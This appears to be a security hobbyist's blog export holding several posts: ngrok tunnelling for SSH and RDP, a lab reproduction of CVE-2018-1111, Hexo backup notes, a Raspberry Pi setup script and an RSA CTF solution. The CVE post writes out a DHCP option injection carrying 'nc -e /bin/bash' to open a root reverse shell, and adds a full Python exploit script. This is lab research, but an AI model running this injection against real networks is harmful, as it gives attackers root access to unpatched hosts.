&gt;:4443&quot;trust_host_root_certs: falsetunnels:    ssh:       remote_port: 50001       proto:         tcp: &quot;127.0.0.1:22&quot;    mstsc:        remote_port: 50002        proto:         tcp: &quot;127.0.0.2:3389&quot;    web:     subdomain: &quot;web&quot;     proto:       http: 80</code></pre><p>there are two way to use:</p><h3 id="fit-for-web"><a href="#fit-for-web" class="headerlink" title="fit for web:"></a>fit for web:</h3><pre><code>#Linux:./ngrok -config ./ngrok.cfg -subdomain wechat ip:80#Windows:ngrok -config ./ngrok.cfg -subdomain wechat ip:80</code></pre><p>it is easy to assign the domain,BUT !!! it’t can’t be used in tcp</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><pre><code>#winngrok -config ngrok.cfg start mstsc#linux./ngrok -config ngrok.cfg start ssh</code></pre><p>maybe you should see,in mstsc,I use <code>127.0.0.2</code> and in ssh I use <code>127.0.0.1</code></p><p>the reason for it is we can’t mstsc 127.0.0.1 when is os higher than winxp,but we can use 127.0.0.2,127.0.0.3….<br>but linux can ssh 127.0.0.1<br><img src="/img/2018/05/23/mstsc_error.png" alt="mstsc_error"></p><p>The other thing for ngork is add a user,and add it to mstsc groud.Modify the max connections for rdp.In the end,<br>use ngork start the program and mstsc the computer.</p><p><img src="/img/2018/05/23/mstsc_add.png" alt="mstsc_add"><br><img src="/img/2018/05/23/mstsc_addtogroup.png" alt="mstsc_addtogroup"><br><img src="/img/2018/05/23/mstsc_modify.png" alt="mstsc_modify"><br><img src="/img/2018/05/23/mstsc_modify_connections.png" alt="mstsc_modify_connections"></p><p>Go!Than I can use the ESXI anywhere with out school vpn.</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><pre><code class="bash">nohup ngrok -log=stdout 80 &gt; /dev/null &amp;</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Esxi </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2018-1111</title>
      <link href="/2018/05/20/cve-2018-1111/"/>
      <url>/2018/05/20/cve-2018-1111/</url>
      
        <content type="html"><![CDATA[<p>Recently, Red Hat has released a security update that fixes a remote code execution flaw numbered CVE-2018-1111. An attacker can send a response packet to a fake DHCP server to attack the Red Hat system, get root privileges, and execute arbitrary commands.</p><span id="more"></span><h1 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h1><h2 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h2><p>kali x64<br>centos 7<br>vmware14</p><h2 id="Setting-Network"><a href="#Setting-Network" class="headerlink" title="Setting Network"></a>Setting Network</h2><p>Disconnect the networks of kali and centos<br>Set both kali and centos to host-only mode and turn off the host’s dhcp function<br><img src="/img/2018/05/20/netsetting.png" alt="netsetting"></p><h2 id="Configure-kali"><a href="#Configure-kali" class="headerlink" title="Configure kali"></a>Configure kali</h2><p>Configure kali’s ip and add the route</p><pre><code>ifconfig eth0 192.168.131.52 netmask 255.255.255.0route add default gw 192.168.131.52</code></pre><p>Use nc to monitor port 1314</p><pre><code>nc -l -p 1314 -v</code></pre><p>touch a file named dnsmasq.conf,content is</p><pre><code>bind-interfaces interface=eth0 except-interface=lo dhcp-range=192.168.131.10,192.168.131.30,22h dhcp-option=3,192.168.131.52 dhcp-option=6,192.168.131.52 log-queries log-facility=/var/log/dnsmasq.log</code></pre><p>Using dnsmasq to forge dns servers</p><pre><code>dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,&#39;&amp;nc -e /bin/bash 192.168.131.52 1314 #&quot;</code></pre><p><img src="/img/2018/05/20/attack_command.png" alt="attack_command"></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>Let Centos connects to the network and finds the ip address gived by kali<br><img src="/img/2018/05/20/centos_ip.png" alt="centos_ip"></p><p>Now,in kali,nc getshell of centos,and for root privileges<br><img src="/img/2018/05/20/getshell.png" alt="getshell"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The principle has been publish by 360 at <a href="https://www.anquanke.com/post/id/145201">360</a><br>Single quotation marks escaped in the script, execute the script directly with root privileges</p><blockquote><p>–dhcp-option&#x3D;”252,x’&amp;nc -e &#x2F;bin&#x2F;bash 10.1.1.1 1337 #”</p></blockquote><h1 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h1><p>In locat,test fedora28,centos7 passed,centos6,redhat5 game over</p><h1 id="Fixed"><a href="#Fixed" class="headerlink" title="Fixed"></a>Fixed</h1><pre><code>yum update dhclient </code></pre><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">#/usr/bin/python#encoding = utf-8from pwn import *import osimport sysimport time# author : xyzz# time : 20180520ip=&#39;192.168.131.52&#39;port=1314  # context.log_level=&#39;debug&#39;def pwn(ip,port):    f=open(&#39;dnsmasq.conf&#39;,&#39;w&#39;)    start = ip[:ip.rfind(&#39;.&#39;)]+&#39;.10&#39;    end = ip[:ip.rfind(&#39;.&#39;)]+&#39;.30&#39;    dnsmasq = &#39;&#39;&#39;bind-interfaces interface=eth0 except-interface=lo dhcp-range=&#123;start&#125;,&#123;end&#125;,22h dhcp-option=3,&#123;ip&#125; dhcp-option=6,&#123;ip&#125; log-queries log-facility=/var/log/dnsmasq.log&#39;&#39;&#39;.format(ip=ip,start=start,end=end)    f.write(dnsmasq)    f.close()    cm=[]    cm.append(&#39;ifconfig eth0 &#123;ip&#125; netmask 255.255.255.0 &#39;.format(ip=ip))    cm.append(&#39;route add default gw &#123;ip&#125;&#39;.format(ip=ip))    cm.append(&#39;&#39;&#39;dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,&#39;&amp;nc -e /bin/bash &#123;ip&#125; &#123;port&#125; #&quot;&#39;&#39;&#39;.format(ip=ip,port=port))    q=process(&#39;bash&#39;)    for i in range(len(cm)-1):        q.sendline(cm[i])        time.sleep(1)        # time.sleep(100)    p=process(&#39;bash&#39;)    p.sendline(&#39;nc -l -p &#123;port&#125; -v&#39;.format(port=port))    q.sendline(cm[-1])    time.sleep(3)    p.interactive()    # q.interactive()if __name__ == &#39;__main__&#39;:    pwn(ip,port)</code></pre><p><img src="/img/2018/05/20/exp.png" alt="exp"></p><p>Last at last!Congratulations to my Queen 520 for pleasure~~~</p>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>synchronize the hexo with github</title>
      <link href="/2018/05/19/synchronize-the-hexo-with-github/"/>
      <url>/2018/05/19/synchronize-the-hexo-with-github/</url>
      
        <content type="html"><![CDATA[<p>Recently I move my blog from vps to github with hexo.It’s first time to use hexo.It’s good but I have a question with how to deal with write my blog in different computer.The code of hexo to deploy in github is not with the source code.With the google,I found a really method.<br>In baidu,all method is say to create a branch to save the code.I don’t like it.I want to create a private repository.</p><span id="more"></span><p>Let’s go!</p><h1 id="BACK-UP"><a href="#BACK-UP" class="headerlink" title="BACK_UP"></a>BACK_UP</h1><h2 id="create-a-private-repository-in-github"><a href="#create-a-private-repository-in-github" class="headerlink" title="create a private repository in github"></a>create a private repository in github</h2><p>nothing to say.</p><h2 id="create-a-local-repository"><a href="#create-a-local-repository" class="headerlink" title="create a local repository"></a>create a local repository</h2><p>go to you blog folder,delete all gits of themes.</p><pre><code>rm -rf ./themes/*/.git/</code></pre><p>create a local git repository</p><pre><code>git init</code></pre><p>create a file named .gitignore,put it in the root of blog.content is </p><pre><code>.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/</code></pre><p>than create a file name CNAME in source,content is your domain.</p><h2 id="push-it-to-your-private-repository"><a href="#push-it-to-your-private-repository" class="headerlink" title="push it to your private repository"></a>push it to your private repository</h2><pre><code>git remote add origin https://github.com/&lt;yourname&gt;/myblog.gitgit add .git commit -m &quot;myblog&quot;git push -u origin master</code></pre><p>all the backup is over</p><h1 id="write-in-other-computer"><a href="#write-in-other-computer" class="headerlink" title="write in other computer"></a>write in other computer</h1><h2 id="build-the-environment"><a href="#build-the-environment" class="headerlink" title="build the environment"></a>build the environment</h2><p>install node.js and git  </p><h3 id="install-hexo"><a href="#install-hexo" class="headerlink" title="install hexo"></a>install hexo</h3><p>create folder name hexo and go to it</p><pre><code>npm install -g hexo</code></pre><h2 id="pull-your-blog"><a href="#pull-your-blog" class="headerlink" title="pull your blog"></a>pull your blog</h2><pre><code>git clone https://github.com/&lt;yourname&gt;/myblog.git</code></pre><h2 id="write-a-new-article"><a href="#write-a-new-article" class="headerlink" title="write a new article"></a>write a new article</h2><p>init the hexo environment<br>WARRING!!! DON’T USE <code>hexo init</code>,because the hexo init will rewrite your blog.<br>USE:</p><pre><code>npm install</code></pre><p>the create a new article</p><pre><code>hexo new &quot;test&quot;</code></pre><h2 id="push-it-to-github-and-publish"><a href="#push-it-to-github-and-publish" class="headerlink" title="push it to github and publish"></a>push it to github and publish</h2><p>publish it to hexo</p><pre><code>hexo cleanhexo ghexo shexo d</code></pre><p>push it to github</p><pre><code>git statusgit add .git commitgit push</code></pre><h1 id="update-the-hexo"><a href="#update-the-hexo" class="headerlink" title="update  the hexo"></a>update  the hexo</h1><p>exec these commands to update the hexo</p><pre><code>git fetch -all # pull all files from github to locatgit reset --hard origin/master #Force local content to just sync git cloud content</code></pre><p>the reason for don’t use pull is there are many files in local.Reset does nothing to the file being pulled.Use pull may take some mistake because of the target.</p><p>END!<br>ENjoy the github!</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flow meter</title>
      <link href="/2018/05/19/flow-meter/"/>
      <url>/2018/05/19/flow-meter/</url>
      
        <content type="html"><![CDATA[<p>All is build in Raspberry Pi 3b</p><p>this is a bash for Raspberry Pi to get a gpio python php mysql and open i2c-0</p><span id="more"></span><pre><code class="bash">pi.sh#sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak;#sudo echo &quot;deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ jessie main non-free contrib&quot;&gt;&gt;/etc/apt/sources.list.d/raspi.list;#sudo echo &quot;deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ jessie main non-free contrib&quot;&gt;&gt;/etc/apt/sources.list.d/raspi.list;sudo apt-get update;sudo apt-get upgrade -y;sudo apt-get install vim apache2 zsh htop php5 -y;sudo apt-get install tightvncserver -y;sudo apt-get install xrdp -y;#sudo service ufw restart;sudo service xrdp restart;sudo apt-get install mysql-server mysql-client -y;sudo apt-get -y install php5-mcrypt php5-curl php5-cli php5-mysql php5-gd php5-intl php5-xsl;sudo apt-get install python-smbus -y;sudo apt-get install libi2c-dev -y;sudo apt-get install i2c-tools -y;sudo apt-get install libmysqlclient-dev python-dev -y;sudo pip install -i https://pypi.tuna.tsinghua.edu.cn/simple MySQL-python Adafruit-GPIO;sudo echo &quot;device_tree=bcm2710-rpi-3-b.dtb&quot;&gt;&gt;/boot/config.txt;sudo echo &quot;dtparam=i2c_arm=on&quot;&gt;&gt;/boot/config.txt;sudo echo &quot;dtparam=i2c1=on&quot;&gt;&gt;/boot/config.txt;sudo echo &quot;dtparam=i2c0=on&quot;&gt;&gt;/boot/config.txt;sudo echo &quot;dtparam=i2c_vc=on&quot;&gt;&gt;/boot/config.txt;sudo echo &quot;dtparam=spi=on&quot;&gt;&gt;/boot/config.txt;#i2c-0;sudo rm /var/www/html/index.html;sudo cp -r ./html /var/www;sudo cp -r ./over ~/;</code></pre><p>git clone the source code and make it in right path</p><pre><code class="bash">git clone https://github.com/chnxyzz/Raspberry-Pi-for-Flow-meter.gitcd Raspberry-Pi-for-Flow-metersudo suchmod +x pi.sh./pi.sh</code></pre><p>we should create a database and source the tables;</p><pre><code class="sql">cd /var/www/htmlmysql -u root -pcreate database qiti;source /var/www/html/qiti.sql;exit</code></pre><p>Do reboot<br>Than you can see it in <a href="http://ip/">http://ip/</a>;<br>Over!!!</p>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Raspberrypi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa_combinations</title>
      <link href="/2018/05/17/rsa-combinations/"/>
      <url>/2018/05/17/rsa-combinations/</url>
      
        <content type="html"><![CDATA[<p>15号做的，算是迁移博客后的第一篇吧</p><pre><code class="python">#! /usr/bin/python2.7from Crypto.Util.number import size,bytes_to_long,getStrongPrimefrom itertools import combinationsmsg = bytes_to_long(&quot;Your secret flag is : flag&#123;**************************&#125;&quot;)e = 65537pri = []f = open(&#39;cipherx.txt&#39;, &#39;w&#39;)for i in range(5):    pri.append(getStrongPrime(1024,65537))print(&#39;pri&#39;,pri)for k in combinations(pri, 2):    n = k[0] * k[1]    print k[0],k[1]    f.write(str(pow(msg, e, n)) + &#39;\n&#39;)</code></pre><p>由5个1024bit的强素数进行两两组合一共生成10组密文如下：</p><span id="more"></span><pre><code class="python">1345598117298332646410231193776283166178831062636107678616499448779394532698111119706670346778406358467754531646448622269017731999706575916837465304049671205956868240658420272161658286370265497506695006046698642258225700170318785392780907582552834332909177520001220886056369205868481977569829097861778057759401421067286588049787439273869708644574434265634750758761342899307525725554702972425963593166597178561473890904228620727973960354318889250435813304328926446491576312142443751368847454325274325075083775496244418926576805849321712038022923847842839074758084727565939849195901142539879460620076044957414032676133548881877083283176200945076148002742269811070859295902541854252735590429761715039079437931948428458908351334068856719256815173477314391240399712685357724413899435262570182437145125925935123232967259416276315828409379362302897324640688193950848475037361539910184266011480011714106806103963153984558684765192425233643706433152639036568997076438571650052921449614187363906288791835345540509464020087485370618514286747519483798570998278887668675292918435582470676502180138413205669491282478402924515995285687858400319470441739162307741258508385712732287402350678572736730727754796064795055584117476228799816749617954963981246234818568605038771725387770032809896657624658751197487822667705150496788266236821445252745402061440344837126297118817722352360943422714353348519968257483217425318287123603122559539044278216514618542935008251728016376351207287908907419066172027356649934716661853550169371283110451199593919378518682893908073257597996213276417788967527409800490507319098619694553882580772197585922179030322385772341029003564359719244782484762058530989277184051441547024568631595655539528137422918541855814336215841836541683256179952847812650782272979437883178787135567291812430132598562391722110607279005808604132547633446702754242594580770708542361610639709046414528866122410101490769310465459608151809203182428958055365559713640029358339058198921983829385879630312917790356279448700966032412999248048479125684965317791644070976335731723773202697887693637184321123877706433089707778244669857727820292222165060978490913648898375331637432806004168886283350226138660521438665675046919859518496162405650316843667452833845448844568916259530765164933893992681118139758342634704979947103702492842436595607468936363498771488006436632655757814820579540631031580781087319990686422094950951664386932520849450473014714505951657998099412449034320876644753681061874459488280776920159709118046469382822420527729949168450775690707300704539693828193851528705628135496525422345016502475549991189972876126567686571699178745003605528825795071480779647880355199271891843376503116960413462976156794892793717873156658798660865917158682600889432560080411458913557734323812710435976734246585695169275458823203435357718727209450221657444627402080234732141825067013115736062304229769981062938031565520981428538576351217137703887653732651535577409216294966995577179877654692706469343009132950075132194138498836131836017281664111811137876898405812663597852509850192125325839608004607880154915212091418073782411520553214182135709421767268933861097557470068670598830761237108296366132955527825989098372862689616150847719971020880914262684813844505249039731390296288313064277036616294317850242554242344468349017823603991546642546139312359635120516022621977198868713265236780584328968456455227210401242292651898111573896055644196069499504205254423973191477361052269017513569237003435455766967610384127786317357129201800175882818678442257638418605140567086462026872695510406713566416179338847089594383139719544078973639147656333759205784973323451162915648440751084782358602950098354039646328692181357908591122714365563835164916039205361337722399874645693508152568591783310427980046181316379230160163292883630643630277488255893155376304687385437264543387603772222089964776126446645877253936359277280636602516006008239202249695904360861647963387182484353913976526986655732413966966918029988046496081237374754371188422381120417324355830716133083460727561228509337936035853662391515749425670198499189177169858490054973227765966780528972386841434507889591338348031801076062808347482028967038215624164631527878998770194325169848351978558824237421468468481244766740222355308554775649093126681802236689499752048963657676352014345576123922473849661397275053996298243554884261414191820929237708168650853330395912319504073426952208513086627198829384154042315234052506082911684608144173835091410795393615116386997884885069683405033389454289189585622646957977150864405507253019700368456175153569120706431504842630017193823414614613515543944012768438615372135192092455771020625920899643657460748140525123446385745452885018242994907719060418829076821951353655094288932417789785658686354925401717179930381179237133075628900875416109603229568575866141143927588631408100548721530988132959911381450682687082674104687988294384311340599275049224252503713916928373410187351350622662265955898096596034955605160181863639059369911123874207923543604873574250100966651792183473217226333358418989144798183066175029579144575889757035869121422897120746930698865589101388220933138542795550252219257035926847607981211116003245829392021813188361668332304123756374394356389557766052021890576761903891565911377580079135411911109445807343621921605560323883311377438724918319862710536493491829719011932526949489178938431424231597088507349606624705710639902814026973623447386060863198024196550561592444271541365817501703137426560980093599645916305329625978898076510219970183955551157273079903477442420415066745705913332960559851272168836161858864856687615100156867932858500059203383582659999680270947712850092591947365553338831150848535525568756863490320019679102804007709747313186252161566229585999657772047185972884107522202907260488147758131548047735509416576778951156037782507571965765760567109821746219259712533369530160331404056822935924868818144471996283443950605787104623265573763097577017088633658357190202370173046308936352735690024216178434559387107878752418634566838258964132836294305792991271935081972613859675575909742688564959474926073661839487937083301362266785004789397144843903897244356681794196480</code></pre><p>解法：<br>$$c1 \equiv {m^e}\pmod{n1 \cdot n2}$$<br>$$c2 \equiv {m^e}\pmod{n1 \cdot n3}$$<br>$$c3 \equiv {m^e}\pmod{n1 \cdot n4}$$<br>由1-2，3-2得：<br>$${c1-c2} &#x3D; {k1 \cdot n1 \cdot ({n2-n3} )}$$<br>$${c3-c2} &#x3D; {k1 \cdot n1 \cdot ({n4-n3} )}$$<br>这样就得到了一个公因数n1,再随便出一个公因数2就搞定了<br>数字的选择就在里面挑几个就行了，小数被减就ok，别出现负数<br>代码：</p><pre><code class="python">#! usr/bin/python2.7#coding=utf-8import binasciiimport gmpy2def gcd(a, b):    if a &lt; b:        a, b = b, a    while b != 0:        temp = a % b        a = b        b = temp    return adef egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#39;modular inverse does not exist&#39;)    else:        return x % mc2 = 1246234818568605038771725387770032809896657624658751197487822667705150496788266236821445252745402061440344837126297118817722352360943422714353348519968257483217425318287123603122559539044278216514618542935008251728016376351207287908907419066172027356649934716661853550169371283110451199593919378518682893908073257597996213276417788967527409800490507319098619694553882580772197585922179030322385772341029003564359719244782484762058530989277184051441547024568631595655539528137422918541855814336215841836541683256179952847812650782272979437883178787135567291812430132598562391722110607279005808604132547633446702754242c1 = 13455981172983326464102311937762831661788310626361076786164994487793945326981111197066703467784063584677545316464486222690177319997065759168374653040496712059568682406584202721616582863702654975066950060466986422582257001703187853927809075825528343329091775200012208860563692058684819775698290978617780577594014210672865880497874392738697086445744342656347507587613428993075257255547029724259635931665971785614738909042286207279739603543188892504358133043289264464915763121424437513688474543252743250750837754962444189265768058493217120380229238478428390747580847275659398491959011425398794606200760449574140326761335c3 = 4888187708328317620094507614800274226981107085929590254185425273559042976171503907943793194842845890835133406885671925681517347731439124039971268535772441389943526257018243714512592593512323296725941627631582840937936230289732464068819395084847503736153991018426601148001171410680610396315398455868476519242523364370643315263903656899707643857165005292144961418736390628879183534554050946402008748537061851428674751948379857099827888766867529291843558247067650218013841320566949128247840292451599528568785840031947044173916230774125850838571273228740235067857273673072775479606479505558411747622879981674961795496398c4 = 5945807707085423616106397090464145288661224101014907693104654596081518092031824289580553655597136400293583390581989219838293858796303129177903562794487009660324129992480484791256849653177916440709763357317237732026978876936371843211238777064330897077782446698577278202922221650609784909136488983753316374328060041688862833502261386605214386656750469198595184961624056503168436674528338454488445689162595307651649338939926811181397583426347049799471037024928424365956074689363634987714880064366326557578148205795406310315807810873199906864220949509516643869325208494504730147145059516579980994124490343208766447536810c5 = 6187445948828077692015970911804646938282242052772994916845077569070730070453969382819385152870562813549652542234501650247554999118997287612656768657169917874500360552882579507148077964788035519927189184337650311696041346297615679489279371787315665879866086591715868260088943256008041145891355773432381271043597673424658569516927545882320343535771872720945022165744462740208023473214182506701311573606230422976998106293803156552098142853857635121713770388765373265153557740921629496699557717987765469270646934300913295007513219413849883613183601728166411181113787689840581266359785250985019212532583960800460788015491c6 = 5212091418073782411520553214182135709421767268933861097557470068670598830761237108296366132955527825989098372862689616150847719971020880914262684813844505249039731390296288313064277036616294317850242554242344468349017823603991546642546139312359635120516022621977198868713265236780584328968456455227210401242292651898111573896055644196069499504205254423973191477361052269017513569237003435455766967610384127786317357129201800175882818678442257638418605140567086462026872695510406713566416179338847089594383139719544078973639147656333759205784973323451162915648440751084782358602950098354039646328692181357908591122714c7 = 3655638351649160392053613377223998746456935081525685917833104279800461813163792301601632928836306436302774882558931553763046873854372645433876037722220899647761264466458772539363592772806366025160060082392022496959043608616479633871824843539139765269866557324139669669180299880464960812373747543711884223811204173243558307161330834607275612285093379360358536623915157494256701984991891771698584900549732277659667805289723868414345078895913383480318010760628083474820289670382156241646315278789987701943251698483519785588242374214684684812447667402223553085547756490931266818022366894997520489636576763520143455761239c8 = 22473849661397275053996298243554884261414191820929237708168650853330395912319504073426952208513086627198829384154042315234052506082911684608144173835091410795393615116386997884885069683405033389454289189585622646957977150864405507253019700368456175153569120706431504842630017193823414614613515543944012768438615372135192092455771020625920899643657460748140525123446385745452885018242994907719060418829076821951353655094288932417789785658686354925401717179930381179237133075628900875416109603229568575866141143927588631408100548721530988132959911381450682687082674104687988294384311340599275049224252503713916928373410c9 = 1873513506226622659558980965960349556051601818636390593699111238742079235436048735742501009666517921834732172263333584189891447981830661750295791445758897570358691214228971207469306988655891013882209331385427955502522192570359268476079812111160032458293920218131883616683323041237563743943563895577660520218905767619038915659113775800791354119111094458073436219216055603238833113774387249183198627105364934918297190119325269494891789384314242315970885073496066247057106399028140269736234473860608631980241965505615924442715413658175017031374265609800935996459163053296259788980765102199701839555511572730799034774424c10= 20415066745705913332960559851272168836161858864856687615100156867932858500059203383582659999680270947712850092591947365553338831150848535525568756863490320019679102804007709747313186252161566229585999657772047185972884107522202907260488147758131548047735509416576778951156037782507571965765760567109821746219259712533369530160331404056822935924868818144471996283443950605787104623265573763097577017088633658357190202370173046308936352735690024216178434559387107878752418634566838258964132836294305792991271935081972613859675575909742688564959474926073661839487937083301362266785004789397144843903897244356681794196480p = gmpy2.gcd((c1-c2),(c3-c2))q = gmpy2.gcd((c6-c9),(c7-c9))c = c1n = p*qd = modinv(65537,(p-1)*(q-1))m = hex(pow(c,d,n))flag = m[2:]print(binascii.unhexlify(flag))</code></pre><p>参考:[Eb0ny]<a href="https://eb0ny.github.io/2017/09/26/WDCTFfinal-RSA/">https://eb0ny.github.io/2017/09/26/WDCTFfinal-RSA/</a></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
